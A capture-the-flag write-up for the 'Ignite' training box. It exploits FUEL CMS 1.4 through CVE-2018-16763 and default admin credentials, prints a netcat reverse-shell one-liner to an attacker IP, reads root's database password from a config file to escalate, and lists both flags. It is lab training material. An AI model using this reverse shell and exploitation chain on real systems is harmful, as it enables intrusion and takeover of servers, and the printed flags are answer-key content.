
# Ignite

## Description

A new start-up has a few issues with their web server.

Root the box! Designed and created by DarkStar7471, built by lollava aka Paradox.

## Reconaissance phase

### Services

The machine has only http enabled:

~~~
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
~~~

### Hidden files

We can find a `robots.txt` file, that discloses a `/fuel/` directory:

~~~
$ curl -s 10.10.141.71/robots.txt
User-agent: *
Disallow: /fuel/
~~~

Other interesting directories are served by the FuelCMS application, but we'll see this later.

### Outdated version

When we connect to http://10.10.141.71/, we are provided with a default Welcome page from Fuel CMS v1.4.

At the time of this writing, the latest release is 1.4.6, and the website is vulnerable to CVE-2018-16763 (https://www.exploit-db.com/exploits/47138) which allows remote code execution.

### Default credentials

We find on the documentation (https://docs.getfuelcms.com/general/security) that default credentials are admin/admin. We can also use them as the default admin password has not been changed.

### Upload forms

There is an upload form (http://10.10.141.71/fuel/pages/upload) but uploads seem to be disabled on the server

Under Assets > Upload (http://10.10.141.71/fuel/assets/create/?group_id=615731685a32567a), there is another upload form. Uploaded documents are stored in:
* http://10.10.141.71/assets/docs/
* http://10.10.141.71/assets/images/
* http://10.10.141.71/assets/pdf/

### User.txt

**Exploit**

Let's download the exploit. Unfortunately, it was developed in python2, which is no longer the standard, and I had to fine tune it to work with python3. The updated version of the exploit is available [here](files/exploit.py).

**Reverse shell**

After trying several reverse shells from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I eventually found one that worked with the exploit:

~~~
$ python exploit.py 
cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 1234 >/tmp/f
~~~

Here is the output on my reverse shell:

~~~
$ nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.5.126.
Ncat: Connection from 10.10.5.126:60882.
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b 
~~~

Flag: `6470e394cbf6dab6a91682cc8585059b`

## Root.txt

Now we obviously need to elevate our privileges to read the flag in `/root`.

Let's start by spawning a shell in python:

~~~
$ python -c 'import pty; pty.spawn("/bin/bash")'
~~~

Unfortunately, `www-data` is not in the sudoers.

Back to the PHP application, as it seems the admins are not very good at security, we may check if the database has been set up with `root`. If this is the case, we may think that the `root` password is the same for the database and the `root` user. Let's check

~~~
$ cat /var/www/html/fuel/application/config/database.php
cat /var/www/html/fuel/application/config/database.php                  

...[SNIP]...

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',

...[SNIP]...
~~~

Here we go:

~~~
www-data@ubuntu:/var/www/html$ su - root
su - root
Password: mememe
root@ubuntu:~# whoami
root
root@ubuntu:~# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
~~~

Flag: `b9bbcb33e11b80be759c4e844862482d`